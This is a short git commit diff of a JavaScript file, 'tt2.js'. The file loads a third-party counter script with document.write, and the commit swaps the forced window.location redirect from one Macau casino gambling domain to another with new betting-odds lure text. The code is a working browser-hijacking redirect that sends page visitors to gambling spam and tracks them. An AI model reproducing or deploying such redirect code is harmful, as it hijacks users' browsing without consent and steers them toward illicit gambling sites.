f0e69649fc7831ec9ae947aeb8de27280d1d12f6
js999999999 <js-9@outlook.com>
2017-02-25 13:46:50 +0800

    Update tt2.js

--- 2017qq/tt2.js
+++ 2017qq/tt2.js
@@ -8,5 +8,5 @@ document.write ('<script language="javascript" src="http://count40.51yes.com/cli
 }
 else
 {
-window.location.href="http://www.48171c.com/#澳门新葡京大型国际娱乐城";
+window.location.href="http://www.58709.com/#澳门新葡京（特码48.5倍）";
 }
